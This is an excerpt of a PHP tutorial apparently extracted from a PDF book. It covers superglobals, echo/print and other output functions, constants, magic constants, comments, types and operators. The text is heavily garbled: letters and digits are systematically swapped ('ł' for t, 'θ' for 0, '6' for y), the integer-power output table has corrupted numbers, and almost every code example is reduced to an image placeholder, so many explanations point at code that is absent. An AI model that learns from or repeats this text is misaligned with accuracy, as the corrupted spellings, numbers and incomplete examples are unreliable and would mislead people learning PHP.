/\*\*

Wiﾕﾕ prinł łhe foﾕﾕowing dełaiﾕs on my ﾕocaﾕ XAMPP

Array

(

\[MIBDIRS\]  \=>  C:/xampp/php/exłras/mibs \[MYSQL\_HOME\] \=> \\xampp\\mysqﾕ\\bin \[OPENSSL\_CONF\] \=> C:/xampp/apache/bin/openssﾕ.cnf \[PHP\_PEAR\_SYSCONF\_DIR\] \=> \\xampp\\php

\[PHPRC\] \=> \\xampp\\php \[TMP\] \=> \\xampp\\łmp \[HTTP\_HOST\] \=> ﾕocaﾕhosł

\[HTTP\_CONNECTION\] \=> keep-aﾕive \[HTTP\_CACHE\_CONTROL\] \=> max-age=0 \[HTTP\_UPGRADE\_INSECURE\_REQUESTS\] \=> 1

\[HTTP\_USER\_AGENT\] \=> Moziﾕﾕa/5.0 (Windows NT 6.1; WOW64) AppﾕeWebKił/537.36 (KHTML, ﾕike Gecko)

Chrome/52.0.2743.82 Safari/537.36

\[HTTP\_ACCEPT\] \=> łexł/hłmﾕ,appﾕicałion/xhłmﾕ+xmﾕ,appﾕicałion/xmﾕ;q\=0.9,image/webp,\*; q\=0.8 \[HTTP\_ACCEPT\_ENCODING\] \=> gzip, defﾕałe, sdch

\[HTTP\_ACCEPT\_LANGUAGE\]  \=> en-US,en;q=0.8

\[PATH\] \=> C:\\xampp\\php;C:\\ProgramDała\\ComposerSełup\\bin; \[SysłemRooł\] \=> C:\\Windows

\[COMSPEC\]  \=>  C:\\Windows\\sysłem32\\cmd.exe

\[PATHEXT\]​\=>​.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC

\[WINDIR\] \=> C:\\Windows

\[SERVER\_SIGNATURE\] \=> Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12 Server ał ﾕocaﾕhosł Porł 80 \[SERVER\_SOFTWARE\] \=> Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12

\[SERVER\_NAME\] \=> ﾕocaﾕhosł

\[SERVER\_ADDR\] \=> ::1

\[SERVER\_PORT\] \=> 80

\[REMOTE\_ADDR\] \=> ::1

\[DOCUMENT\_ROOT\] \=> C:/xampp/hłdocs \[REQUEST\_SCHEME\] \=> hłłp \[CONTEXT\_PREFIX\] \=>

\[CONTEXT\_DOCUMENT\_ROOT\] \=> C:/xampp/hłdocs \[SERVER\_ADMIN\] \=> posłmasłer@ﾕocaﾕhosł \[SCRIPT\_FILENAME\] \=> C:/xampp/hłdocs/abcd.php \[REMOTE\_PORT\] \=> 63822

\[GATEWAY\_INTERFACE\] \=> CGI/1.1 \[SERVER\_PROTOCOL\] \=> HTTP/1.1 \[REQUEST\_METHOD\] \=> GET \[QUERY\_STRING\] \=>

\[REQUEST\_URI\] \=> /abcd.php \[SCRIPT\_NAME\]  \=>  /abcd.php \[PHP\_SELF\] \=> /abcd.php \[REQUEST\_TIME\_FLOAT\] \=> 1469374173.88

\[REQUEST\_TIME\] \=> 1469374173

)

\*/

?>

$\_ENV: This SuperGlobal Variable Shell Environment Variable details under which the PHP is running.

$\_COOKIE: This SuperGlobal Variable is used to retrieve Cookie value with given Key.

![](image_rsrcKPA.jpg)

$\_SESSION: This SuperGlobal Variable is used to Set and Retrieve Session Value which is stored on Server.

![](image_rsrcKPB.jpg)

Chapter 5: Outputting the Value of a Variable

To build a dynamic and interactive PHP program, it is useful to output variables and their values. The PHP language allows for multiple methods of value output. This topic covers the standard methods of printing a value in PHP and where these methods can be used.

Section 5.1: echo and print

echo and print are language constructs, not functions. This means that they don't require parentheses around the argument like a function does (although one can always add parentheses around almost any PHP expression and thus echo("test") won't do any harm either). They output the string representation of a variable, constant, or expression. They can't be used to print arrays or objects.

![](image_rsrcKPC.jpg)![](image_rsrcKPD.jpg)![](image_rsrcKPE.jpg)Assign the string Joel to the variable $name

![](image_rsrcKPF.jpg)

Output the value of $name using echo & print

![](image_rsrcKPG.jpg)

Parentheses are not required, but can be used

![](image_rsrcKPH.jpg)

Using multiple parameters (only echo)

![](image_rsrcKPJ.jpg)

![](image_rsrcKPK.jpg)![](image_rsrcKPM.jpg)print, unlike echo, is an expression (it returns 1), and thus can be used in more places:

![](image_rsrcKPN.jpg)

![](image_rsrcKPP.jpg)The above is equivalent to:

![](image_rsrcKPR.jpg)

Shorthand notation for echo

When outside of PHP tags, a shorthand notation for echo is available by default, using <?= to begin output and ?> to end it. For example:

![](image_rsrcKPS.jpg)

Note that there is no terminating ;. This works because the closing PHP tag acts as the terminator for the single

statement. So, it is conventional to omit the semicolon in this shorthand notation.

Priority of print

Although the print is language construction it has priority like operator. It places between \= += \-= \*= \*\*= /= .= %= &= and and operators and has left association. Example:

![](image_rsrcKPT.jpg)

Same example with brackets:

![](image_rsrcKPU.jpg)

Differences between echo and print

In short, there are two main differences:

![](image_rsrcKPV.jpg)print only takes one parameter, while echo can have multiple parameters.

![](image_rsrcKPW.jpg)print returns a value, so can be used as an expression.

Section 5.2: Outputting a structured view of arra6s and objects

print\_r() \- Outputting Arrays and Objects for debugging

print\_r will output a human readable format of an array or object.

![](image_rsrcKPX.jpg)You may have a variable that is an array or object. Trying to output it with an echo will throw the error: Notice: Array to string conversion. You can instead use the print\_r function to dump a human readable format of this variable.

You can pass true as the second parameter to return the content as a string.

![](image_rsrcKPY.jpg)

This outputs the following:

![](image_rsrcKPZ.jpg)

![](image_rsrcKR0.jpg)

Further, the output from print\_r can be captured as a string, rather than simply echoed. For instance, the following code will dump the formatted version of $myarray into a new variable:

![](image_rsrcKR1.jpg)

Note that if you are viewing the output of PHP in a browser, and it is interpreted as HTML, then the line breaks will not be shown and the output will be much less legible unless you do something like

![](image_rsrcKR2.jpg)

![](image_rsrcKNA.jpg)Opening the source code of a page will also format your variable in the same way without the use of the

<pre> tag.

Alternatively you can tell the browser that what you're outputting is plain text, and not HTML:

![](image_rsrcKR3.jpg)

var\_dump() \- Output human-readable debugging information about content of the argument(s) including its type and value

The output is more detailed as compared to print\_r because it also outputs the type of the variable along with its value and other information like object IDs, array sizes, string lengths, reference markers, etc.

You can use var\_dump to output a more detailed version for debugging.

![](image_rsrcKR4.jpg)

Output is more detailed:

![](image_rsrcKR5.jpg)

Note: If you are using xDebug in your development environment, the output of var\_dump is limited / truncated by default. See the official documentation for more info about the options to change this.

var\_export() \- Output valid PHP Code

var\_export() dumps a PHP parseable representation of the item.

45

![](image_rsrcKR6.jpg)You can pass true as the second parameter to return the contents into a variable.

![](image_rsrcKR7.jpg)

Output is valid PHP code:

![](image_rsrcKR8.jpg)

To put the content into a variable, you can do this:

![](image_rsrcKR9.jpg)

After that, you can output it like this:

![](image_rsrcKRA.jpg)

This will produce the following output:

![](image_rsrcKRB.jpg)

Section 5.3: String concatenation with echo

You can use concatenation to join strings "end to end" while outputting them (with echo or print for example).

You can concatenate variables using a . (period/dot).

![](image_rsrcKRC.jpg)

Similar to concatenation, echo (when used without parentheses) can be used to combine strings and variables together (along with other arbitrary expressions) using a comma (,).

![](image_rsrcKRD.jpg)

![](image_rsrcKRE.jpg)

String concatenation vs passing multiple arguments to echo

Passing multiple arguments to the echo command is more advantageous than string concatenation in some circumstances. The arguments are written to the output in the same order as they are passed in.

![](image_rsrcKRF.jpg)

The problem with the concatenation is that the period . takes precedence in the expression. If concatenated, the above expression needs extra parentheses for the correct behavior. The precedence of the period affects ternary operators too.

![](image_rsrcKRG.jpg)

Section 5.4: printf vs sprintf

printf will output a formatted string using placeholders

sprintf will return the formatted string

![](image_rsrcKRH.jpg)

It is also possible to format a number with these 2 functions. This can be used to format a decimal value used to represent money so that it always has 2 decimal digits.

![](image_rsrcKRJ.jpg)

The two functions vprintf and vsprintf operate as printf and sprintf, but accept a format string and an array of values, instead of individual variables.

Section 5.5: Outputting large integers

On 32-bits systems, integers larger than PHP\_INT\_MAX are automatically converted to float. Outputting these as integer values (i.e. non-scientific notation) can be done with printf, using the float representation, as illustrated below:

![](image_rsrcKRK.jpg)

![](image_rsrcKRM.jpg)echo " ", $i, "\\n";

}

// oułpułs:

pow(1θ24, 1) integer​1θ24

pow(1θ24, 2) integer​1θ48576

pow(1θ24, 3) integer​1θ73741824 pow(1θ24, 4) double  1θ99511627776 pow(1θ24, 5)  double 1.1258999θ68426E+15

1.1258999θ68426E+15

1θ24 1θ24

1θ48576 1θ48576

1θ73741824 1θ73741824

1θ99511627776 1θ99511627776

11258999θ6842624

pow(1θ24, 6)​double

1.1529215θ46θ68E+18

pow(1θ24, 9)​double

1.23794θθ392854E+27

pow(1θ24, 12)​double 1.3292279957849E+36

1.1529215θ46θ68E+18​11529215θ46θ6846976

1.23794θθ392854E+27​123794θθ3928538θ274899124224

1.3292279957849E+36  13292279957849158729θ38θ7θ6θ28θ344576

![](image_rsrcKN7.jpg)Note: watch out for float precision, which is not infinite!

While this looks nice, in this contrived example the numbers can all be represented as a binary number since they are all powers of 1024 (and thus 2). See for example:

![](image_rsrcKRN.jpg)

Section 5.6: Output a Multidimensional Arra6 with index and value and print into the table

![](image_rsrcKRP.jpg)

![](image_rsrcKRR.jpg)

Output Multidimensional Array with index and value in table

![](image_rsrcKRS.jpg)

Chapter 6: Constants

Section 6.1: Defining constants

Constants are created using the const statement or the define function. The convention is to use UPPERCASE letters for constant names.

![](image_rsrcKRT.jpg)Define constant using explicit values

Define constant using another constant

if you have one constant you can define another one based on it:

![](image_rsrcKRU.jpg)

Reserved constants

Some constant names are reserved by PHP and cannot be redefined. All these examples will fail:

![](image_rsrcKRV.jpg)

And a Notice will be issued:

![](image_rsrcKRW.jpg)

Conditional defines

If you have several files where you may define the same variable (for example, your main config then your local config) then following syntax may help avoiding conflicts:

![](image_rsrcKRX.jpg)

const vs define

Thus define allows for dynamic values (i.e. function calls, variables etc.) and even dynamic names and conditional definition. It however is always defining relative to the root namespace.

const is static (as in allows only operations with other constants, scalars or arrays, and only a restricted set of them, the so called constant scalar expressions, i.e. arithmetic, logical and comparison operators as well as array dereferencing), but are automatically namespace prefixed with the currently active namespace.

const only supports other constants and scalars as values, and no operations.

Section 6.2: Class Constants

Constants can be defined inside classes using a const keyword.

![](image_rsrcKRY.jpg)

This is useful to store types of items.

![](image_rsrcKRZ.jpg)

Section 6.3: Checking if constant is defined

Simple check

To check if constant is defined use the defined function. Note that this function doesn't care about constant's value, it only cares if the constant exists or not. Even if the value of the constant is null or false the function will still return true.

![](image_rsrcKS0.jpg)

![](image_rsrcKS1.jpg)

Note that constant becomes "visible" in your code only after the line where you have defined it:

![](image_rsrcKS2.jpg)

Getting all defined constants

To get all defined constants including those created by PHP use the get\_defined\_constants function:

![](image_rsrcKS3.jpg)

To get only those constants that were defined by your app call the function at the beginning and at the end of your script (normally after the bootstrap process):

![](image_rsrcKS4.jpg)

It's sometimes useful for debugging

Section 6.4: Using constants

To use the constant simply use its name:

![](image_rsrcKS5.jpg)

or if you don't know the name of the constant in advance, use the constant function:

![](image_rsrcKS6.jpg)

Section 6.5: Constant arra6s

![](image_rsrcKS7.jpg)

Arrays can be used as plain constants and class constants from version PHP 5.6 onwards: Class constant example

![](image_rsrcKS8.jpg)Plain constant example

Also from version PHP 7.0 this functionality was ported to the define function for plain constants.

![](image_rsrcKS9.jpg)

Chapter 7: Magic Constants

Section 7.1: Difference between ​FUNCTION

METHOD

and

![](image_rsrcKSA.jpg)

returns only the name of the function whereas  NETHOD returns the name of the class along with the name of the function:

![](image_rsrcKSB.jpg)

![](image_rsrcKSC.jpg)Section 7.2: Difference between CLASS     , get\_class() and get\_called\_class()

 CLASS magic constant returns the same result as get\_class() function called without parameters and they both return the name of the class where it was defined (i.e. where you wrote the function call/constant name ).

In contrast, get\_class($this) and get\_called\_class() functions call, will both return the name of the actual class which was instantiated:

![](image_rsrcKSD.jpg)

![](image_rsrcKSE.jpg)

Section 7.3: File & Director6 Constants

Current file

You can get the name of the current PHP file (with the absolute path) using the  FILE magic constant. This is most often used as a logging/debugging technique.

![](image_rsrcKSF.jpg)

Current directory

To get the absolute path to the directory where the current file is located use the  DIR  magic constant.

![](image_rsrcKSG.jpg)

To get the absolute path to the directory where the current file is located, use dirname( FILE ).

![](image_rsrcKSH.jpg)

Getting current directory is often used by PHP frameworks to set a base directory:

![](image_rsrcKSJ.jpg)![](image_rsrcKSK.jpg)

Separators

![](image_rsrcKNA.jpg)Windows system perfectly understands the / in paths so the DIRECTORY\_SEPARATOR is used mainly when parsing paths.

Besides magic constants PHP also adds some fixed constants for working with paths:

![](image_rsrcKSM.jpg)DIRECTORY\_SEPARATOR constant for separating directories in a path. Takes value / on \*nix, and \\ on Windows. The example with views can be rewritten with:

![](image_rsrcKSN.jpg)

![](image_rsrcKSP.jpg)Rarely used PATH\_SEPARATOR constant for separating paths in the $PATH environment variable. It is ; on Windows, : otherwise

Chapter 8: Comments

Section 8.1: Single Line Comments

The single line comment begins with "//" or "#". When encountered, all text to the right will be ignored by the PHP interpreter.

![](image_rsrcKSR.jpg)

Section 8.2: Multi Line Comments

The multi-line comment can be used to comment out large blocks of code. It begins with /\* and ends with \*/.

![](image_rsrcKSS.jpg)

Chapter 9: T6pes

Section 9.1: T6pe Comparison

There are two types of comparison: loose comparison with \== and strict comparison with \==\=. Strict comparison ensures both the type and value of both sides of the operator are the same.

![](image_rsrcKST.jpg)

You can also use strong comparison to check if type and value don't match using !==.

A typical example where the \== operator is not enough, are functions that can return different types, like strpos, which returns false if the searchword is not found, and the match position (int) otherwise:

![](image_rsrcKSU.jpg)

Section 9.2: Boolean

Boolean is a type, having two values, denoted as true or false.

This code sets the value of $foo as true and $bar as false:

![](image_rsrcKSV.jpg)

true and false are not case sensitive, so TRUE and FALSE can be used as well, even FaLsE is possible. Using lower case is most common and recommended in most code style guides, e.g. PSR-2.

Booleans can be used in if statements like this:

![](image_rsrcKSW.jpg)

Due to the fact that PHP is weakly typed, if $foo above is other than true or false, it's automatically coerced to a

The following values result in false:

![](image_rsrcKSX.jpg)![](image_rsrcKSY.jpg)a zero value: θ (integer), θ.θ (float), or 'θ' (string) an empty string '' or array \[\]

![](image_rsrcKSZ.jpg)null (the content of an unset variable, or assigned to a variable)

Any other value results in true.

To avoid this loose comparison, you can enforce strong comparison using \==\=, which compares value and type. See Type Comparison for details.

To convert a type into boolean, you can use the (bool) or (boolean) cast before the type.

![](image_rsrcKT0.jpg)

or call the boolval function:

![](image_rsrcKT1.jpg)

Boolean conversion to a string (note that false yields an empty string):

![](image_rsrcKT2.jpg)

Boolean conversion to an integer:

![](image_rsrcKT3.jpg)

Note that the opposite is also possible:

![](image_rsrcKT4.jpg)

Also all non-zero will return true:

![](image_rsrcKT5.jpg)

Section 9.3: Float

![](image_rsrcKT6.jpg)

![](image_rsrcKH6.jpg)For historical reasons "double" is returned by gettype() in case of a float, and not simply "float"

Floats are floating point numbers, which allow more output precision than plain integers. Floats and integers can be used together due to PHP's loose casting of variable types:

![](image_rsrcKT7.jpg)

php does not show float as float number like other languages, for example:

![](image_rsrcKT8.jpg)

Warning

Floating point precision

(From the PHP manual page)

![](image_rsrcKT9.jpg)Floating point numbers have limited precision. Although it depends on the system, PHP typically give a maximum relative error due to rounding in the order of 1.11e-16. Non elementary arithmetic operations may give larger errors, and error propagation must be considered when several operations are compounded.

![](image_rsrcKTA.jpg)Additionally, rational numbers that are exactly representable as floating point numbers in base 10, like

0.1 or 0.7, do not have an exact representation as floating point numbers in base 2 (binary), which is used internally, no matter the size of the mantissa. Hence, they cannot be converted into their internal binary counterparts without a small loss of precision. This can lead to confusing results: for example, floor((0.1+0.7)\*10) will usually return 7 instead of the expected 8, since the internal representation will be something like 7.9999999999999991118....

![](image_rsrcKTB.jpg)So never trust floating number results to the last digit, and do not compare floating point numbers directly for equality. If higher precision is necessary, the arbitrary precision math functions and gmp functions are available.

Section 9.4: Strings

A string in PHP is a series of single-byte characters (i.e. there is no native Unicode support) that can be specified in four ways:

Single Quoted

Displays things almost completely "as is". Variables and most escape sequences will not be interpreted. The exception is that to display a literal single quote, one can escape it with a back slash ', and to display a back slash, one can escape it with another backslash \\

![](image_rsrcKTC.jpg)

Double Quoted

Unlike a single-quoted string, simple variable names and escape sequences in the strings will be evaluated. Curly braces (as in the last example) can be used to isolate complex variable names.

![](image_rsrcKTD.jpg)

Heredoc

![](image_rsrcKTE.jpg)![](image_rsrcKTF.jpg)In a heredoc string, variable names and escape sequences are parsed in a similar manner to double-quoted strings, though braces are not available for complex variable names. The start of the string is delimited by <<<idenłifier,

and the end by idenłifier, where​is any valid PHP name. The ending identifier must appear on a line

by itself. No whitespace is allowed before or after the identifier, although like any line in PHP, it must also be terminated by a semicolon.

![](image_rsrcKTG.jpg)

Nowdoc

A nowdoc string is like the single-quoted version of heredoc, although not even the most basic escape sequences are evaluated. The identifier at the beginning of the string is wrapped in single quotes.

PHP 5.x Version ≥ 5.3

![](image_rsrcKTH.jpg)

![](image_rsrcKTJ.jpg)

Section 9.5: Callable

![](image_rsrcKTK.jpg)Callables are anything which can be called as a callback. Things that can be termed a "callback" are as follows: Anonymous functions

![](image_rsrcKTM.jpg)Standard PHP functions (note: not language constructs)

![](image_rsrcKTN.jpg)Static Classes

![](image_rsrcKTP.jpg)![](image_rsrcKTR.jpg)non-static Classes (using an alternate syntax) Specific Object/Class Methods

![](image_rsrcKTS.jpg)Objects themselves, as long as the object is found in key θ of an array Example Of referencing an object as an array element:

![](image_rsrcKTT.jpg)

Callbacks can be denoted by callable type hint as of PHP 5.4.

![](image_rsrcKTU.jpg)

Section 9.6: Resources

A resource is a special type of variable that references an external resource, such as a file, socket, stream, document, or connection.

![](image_rsrcKTV.jpg)

There are different (sub-)types of resource. You can check the resource type using get\_resource\_type():

![](image_rsrcKTW.jpg)

You can find a complete list of built-in resource types here.

Section 9.7: T6pe Casting

PHP will generally correctly guess the data type you intend to use from the context it's used in, however sometimes it is useful to manually force a type. This can be accomplished by prefixing the declaration with the name of the required type in parenthesis:

![](image_rsrcKTX.jpg)

But be careful: not all type casts work as one might expect:

![](image_rsrcKTY.jpg)

Section 9.8: T6pe Juggling

PHP is a weakly-typed language. It does not require explicit declaration of data types. The context in which the variable is used determines its data type; conversion is done automatically:

![](image_rsrcKTZ.jpg)

Section 9.9: Null

PHP represents "no value" with the null keyword. It's somewhat similar to the null pointer in C-language and to the NULL value in SQL.

Setting the variable to null:

![](image_rsrcKU0.jpg)

Checking if the variable was set to null:

![](image_rsrcKU1.jpg)

Null vs undefined variable

If the variable was not defined or was unset then any tests against the null will be successful but they will also generate a Notice: Undefined variable: nullvar:

![](image_rsrcKU2.jpg)

Therefore undefined values must be checked with isset:

![](image_rsrcKU3.jpg)

Section 9.10: Integers

Integers in PHP can be natively specified in base 2 (binary), base 8 (octal), base 10 (decimal), or base 16 (hexadecimal.)

![](image_rsrcKU4.jpg)

Integers are 32 or 64 bits long, depending on the platform. The constant PHP\_INT\_SIZE holds integer size in bytes.

PHP\_INT\_MAX and (since PHP 7.0) PHP\_INT\_MIN are also available.

![](image_rsrcKU5.jpg)

Integer values are automatically created as needed from floats, booleans, and strings. If an explicit typecast is

needed, it can be done with the (int) or (integer) cast:

![](image_rsrcKU6.jpg)

Integer overflow will be handled by conversion to a float:

![](image_rsrcKU7.jpg)

There is no integer division operator in PHP, but it can be simulated using an implicit cast, which always 'rounds' by just discarding the float-part. As of PHP version 7, an integer division function was added.

![](image_rsrcKU8.jpg)

(Note that the extra parentheses around (25 / 4) are needed because the (int) cast has higher precedence than the division)

Chapter 10: Operators

An operator is something that takes one or more values (or expressions, in programming jargon) and yields another value (so that the construction itself becomes an expression).

Operators can be grouped according to the number of values they take.

Section 10.1: Null Coalescing Operator (??)

Null coalescing is a new operator introduced in PHP 7. This operator returns its first operand if it is set and not

![](image_rsrcKU9.jpg)NULL. Otherwise it will return its second operand. The following example:

is equivalent to both:

![](image_rsrcKUA.jpg)

and:

![](image_rsrcKUB.jpg)

This operator can also be chained (with right-associative semantics):

![](image_rsrcKUC.jpg)

which is an equivalent to:

![](image_rsrcKUD.jpg)

Note:

When using coalescing operator on string concatenation don't forget to use parentheses ()

![](image_rsrcKUE.jpg)

This will output John only, and if its $firstName is null and $lastName is Doe it will output Unknown Doe. In order to output John Doe, we must use parentheses like this.

![](image_rsrcKUF.jpg)

![](image_rsrcKUG.jpg)

This will output John Doe instead of John only.

Section 10.2: Spaceship Operator (<=>)

PHP 7 introduces a new kind of operator, which can be used to compare expressions. This operator will return -1, 0 or 1 if the first expression is less than, equal to, or greater than the second expression.

![](image_rsrcKUH.jpg)

Objects are not comparable, and so doing so will result in undefined behaviour.

This operator is particularly useful when writing a user-defined comparison function using usort, uasort, or uksort. Given an array of objects to be sorted by their weight property, for example, an anonymous function can use <=\> to return the value expected by the sorting functions.

![](image_rsrcKUJ.jpg)

In PHP 5 this would have required a rather more elaborate expression.

![](image_rsrcKUK.jpg)

Section 10.3: Execution Operator (\`\`)

The PHP execution operator consists of backticks (\`\`) and is used to run shell commands. The output of the command will be returned, and may, therefore, be stored in a variable.

![](image_rsrcKUM.jpg)

Note that the execute operator and shell\_exec() will give the same result.

Section 10.4: Incrementing (++) and Decrementing Operators (--)

Variables can be incremented or decremented by 1 with ++ or \-\-, respectively. They can either precede or succeed variables and slightly vary semantically, as shown below.

![](image_rsrcKUN.jpg)

More information about incrementing and decrementing operators can be found in the official documentation.

Section 10.5: Ternar6 Operator (?:)

The ternary operator can be thought of as an inline if statement. It consists of three parts. The operator, and two outcomes. The syntax is as follows:

![](image_rsrcKUP.jpg)

If the operator is evaluated as true, the value in the first block will be returned (<true value\>), else the value in the second block will be returned (<false value\>). Since we are setting $value to the result of our ternary operator it will store the returned value.

Example:

![](image_rsrcKUR.jpg)

$action would contain the string 'default' if empty($\_POST\['action'\]) evaluates to true. Otherwise it would contain the value of $\_POST\['action'\].

The expression (expr1) ? (expr2) : (expr3) evaluates to expr2 if expr1evaluates to true, and expr3 if expr1

evaluates to false.

It is possible to leave out the middle part of the ternary operator. Expression expr1 ?: expr3 returns expr1 if expr1

evaluates to TRUE, and expr3 otherwise. ?: is often referred to as Elvis operator.

This behaves like the Null Coalescing operator ??, except that ?? requires the left operand to be exactly null while

![](image_rsrcKUS.jpg)?: tries to resolve the left operand into a boolean and check if it resolves to boolean false. Example:

In this example, setWidth accepts a width parameter, or default 0, to change the width session value. If $width is 0 (if $width is not provided), which will resolve to boolean false, the value of getDefaultWidth() is used instead. The getDefaultWidth() function will not be called if $width did not resolve to boolean false.

Refer to Types for more information about conversion of variables to boolean.

Section 10.6: Logical Operators (&&/AND and II/OR)

In PHP, there are two versions of logical AND and OR operators. Operator​True if

$a and $b Both $a and $b are true

$a && $b Both $a and $b are true

$a or $b Either $a or $b is true

$a || $b Either $a or $b is true

Note that the && and || opererators have higher precedence than and and or. See table below:

Evaluation​Result of ‡e​Evaluated as

$e \= false || true True​$e \= (false || true)

$e \= false or true False​($e \= false) or true

Because of this it's safer to use && and || instead of and and or.

Section 10.7: String Operators (. and .=)

![](image_rsrcKUT.jpg)![](image_rsrcKUU.jpg)![](image_rsrcKUV.jpg)There are only two string operators: Concatenation of two strings (dot):

Concatenating assignment (dot=):

![](image_rsrcKUW.jpg)

Section 10.8: Object and Class Operators

Members of objects or classes can be accessed using the object operator (\-\>) and the class operator (::).

![](image_rsrcKUX.jpg)

![](image_rsrcKUY.jpg)

Note that after the object operator, the $ should not be written ($object\->a instead of $object\->$a). For the class operator, this is not the case and the $ is necessary. For a constant defined in the class, the $ is never used.

Also note that var\_dump(MyClass::d()); is only allowed if the function d() does not reference the object:

![](image_rsrcKUZ.jpg)

This causes a 'PHP Fatal error: Uncaught Error: Using $this when not in object context' These operators have left associativity, which can be used for 'chaining':

![](image_rsrcKV0.jpg)

These operators have the highest precedence (they are not even mentioned in the manual), even higher that clone. Thus:

![](image_rsrcKV1.jpg)

The value of $o1 is added to before the object is cloned!

Note that using parentheses to influence precedence did6n9ot work in PHP version 5 and older (it does in PHP 7):

![](image_rsrcKV2.jpg)

Section 10.9: Combined Assignment (+= etc)

The combined assignment operators are a shortcut for an operation on some variable and subsequently assigning this new value to that variable.

Arithmetic:

![](image_rsrcKV3.jpg)

Processing Multiple Arrays Together

![](image_rsrcKV4.jpg)

Combined concatenation and assignment of a string:

![](image_rsrcKV5.jpg)

Combined binary bitwise assignment operators:

![](image_rsrcKV6.jpg)

Section 10.10: Altering operator precedence (with parentheses)

The order in which operators are evaluated is determined by the operator precedence (see also the Remarks section).

In

![](image_rsrcKV7.jpg)

![](image_rsrcKV8.jpg)![](image_rsrcKV8.jpg)![](image_rsrcKV9.jpg)![](image_rsrcKV8.jpg)$a gets a value of 10 because 2 \* 3 is evaluated first (multiplication has a higher precedence than addition) yielding a sub-result of 6 + 4, which equals to 10.

The precedence can be altered using parentheses: in

![](image_rsrcKVA.jpg)

$a gets a value of 14 because (3 + 4) is evaluated first.

Section 10.11: Basic Assignment (=)

![](image_rsrcKVB.jpg)

results in $a having the value some string.

The result of an assignment expression is the value being assigned. Note that a single equal sign \= is NOT for comparison!

![](image_rsrcKVC.jpg)

does the following:

1.  Line 1 assigns 3 to $a.

2.  Line 2 assigns 5 to $a. This expression yields value 5 as well.

3.  Line 2 then assigns the result of the expression in parentheses (5) to $b.

Thus: both $a and $b now have value 5.

Section 10.12: Association

Left association

If the preceedence of two operators is equal, the associativity determines the grouping (see also the Remarks section):

![](image_rsrcKVD.jpg)

\* and % have equal precedence and left associativity. Because the multiplication occurs first (left), it is grouped.

![](image_rsrcKVE.jpg)![](image_rsrcKVF.jpg)

Now, the modulus operator occurs first (left) and is thus grouped. Right association

Both $a and $b now have value 2 because $b += 1 is grouped and then the result ($b is 2) is assigned to $a.

Section 10.13: Comparison Operators

Equality

For basic equality testing, the equal operator \== is used. For more comprehensive checks, use the identical operator

The identical operator works the same as the equal operator, requiring its operands have the same value, but also requires them to have the same data type.

For example, the sample below will display 'a and b are equal', but not 'a and b are identical'.

![](image_rsrcKVG.jpg)

When using the equal operator, numeric strings are cast to integers. Comparison of objects

\=== compares two objects by checking if they are exactly the same instance. This means that new stdClass() === new stdClass() resolves to false, even if they are created in the same way (and have the exactly same values).

\== compares two objects by recursively checking if they are equal (deep equals). That means, for $a \== $b, if $a and

$b are:

1.  of the same class

2.  have the same properties set, including dynamic properties

3.  for each property $property set, $a\->property \== $b\->property is true (hence recursively checked).

Other commonly used operators They include:

1.  Greater Than (\>)

2.  Lesser Than (<)

3.  Greater Than Or Equal To (\>=)

4.  Lesser Than Or Equal To (<=)

5.  Not Equal To (!=)

6.  Not Identically Equal To (!==)

1.  Greater Than: $a \> $b, returns true if $a's value is greater than of $b, otherwise returns false.

Example:

![](image_rsrcKVH.jpg)

2.  Lesser Than: $a < $b, returns true if $a's value is smaller that of $b, otherwise returns false.

Example:

![](image_rsrcKVJ.jpg)

3.  Greater Than Or Equal To: $a \>= $b, returns true if $a's value is either greater than of $b or equal to $b, otherwise returns false.

![](image_rsrcKVK.jpg)

4.  Smaller Than Or Equal To: $a <= $b, returns true if $a's value is either smaller than of $b or equal to $b, otherwise returns false.

Example:

![](image_rsrcKVM.jpg)

5/6. Not Equal/Identical To: To rehash the earlier example on equality, the sample below will display 'a and b are not identical', but not 'a and b are not equal'.

![](image_rsrcKVN.jpg)

Section 10.14: Bitwise Operators

Prefix bitwise operators

Bitwise operators are like logical operators but executed per bit rather than per boolean value.

![](image_rsrcKVP.jpg)

Bitmask-bitmask operators

Bitwise AND &: a bit is set only if it is set in both operands

![](image_rsrcKVR.jpg)

Bitwise OR |: a bit is set if it is set in either or both operands

![](image_rsrcKVS.jpg)

Bitwise XOR ^: a bit is set if it is set in one operand and not set in another operand, i.e. only if that bit is in different state in the two operands

![](image_rsrcKVT.jpg)

Example uses of bitmasks

These operators can be used to manipulate bitmasks. For example:

![](image_rsrcKVU.jpg)

are combining bitmasks, not adding two normal scalar integers.

![](image_rsrcKVV.jpg)

This example (assuming $option always only contain one bit) uses:

![](image_rsrcKVW.jpg)the ^ operator to conveniently toggle bitmasks.

![](image_rsrcKVX.jpg)the | operator to set a bit neglecting its original state or other bits

![](image_rsrcKVY.jpg)![](image_rsrcKVZ.jpg)the ~ operator to convert an integer with only one bit set into an integer with only one bit not set the & operator to unset a bit, using these properties of &:

![](image_rsrcKW0.jpg)Since &= with a set bit will not do anything ((1 & 1) === 1, (θ & 1) === θ), doing &= with an integer with only one bit not set will only unset that bit, not affecting other bits.

![](image_rsrcKW1.jpg)&= with an unset bit will unset that bit ((1 & θ) === θ, (θ & θ) === θ)

![](image_rsrcKW2.jpg)Using the & operator with another bitmask will filter away all other bits not set in that bitmask.

If the output has any bits set, it means that any one of the options are enabled.

![](image_rsrcKW3.jpg)

If the output has all bits of the bitmask set, it means that all of the options in the bitmask are enabled.

![](image_rsrcKW4.jpg)

Bear in mind that these comparison operators: (< \> <= \>= \== \=== != !== <\> <=\>) have higher precedence than these bitmask-bitmask operators: (| ^ &). As bitwise results are often compared using these comparison operators, this is a common pitfall to be aware of.

Bit-shifting operators

Bitwise left shift <<: shift all bits to the left (more significant) by the given number of steps and discard the bits

<< $x is equivalent to unsetting the highest $x bits and multiplying by the $xth power of 2

![](image_rsrcKW5.jpg)

Bitwise right shift \>>: discard the lowest shift and shift the remaining bits to the right (less significant)

\>> $x is equivalent to dividing by the $xth power of 2 and discard the non-integer part

![](image_rsrcKW6.jpg)

Example uses of bit shifting:

Fast division by 16 (better performance than /= 16)

![](image_rsrcKW7.jpg)

On 32-bit systems, this discards all bits in the integer, setting the value to 0. On 64-bit systems, this unsets the most significant 32 bits and keep the least

![](image_rsrcKW8.jpg)

significant 32 bits, equivalent to $x & θxFFFFFFFF

Note: In this example, printf("%'θ6b") is used. It outputs the value in 6 binary digits.

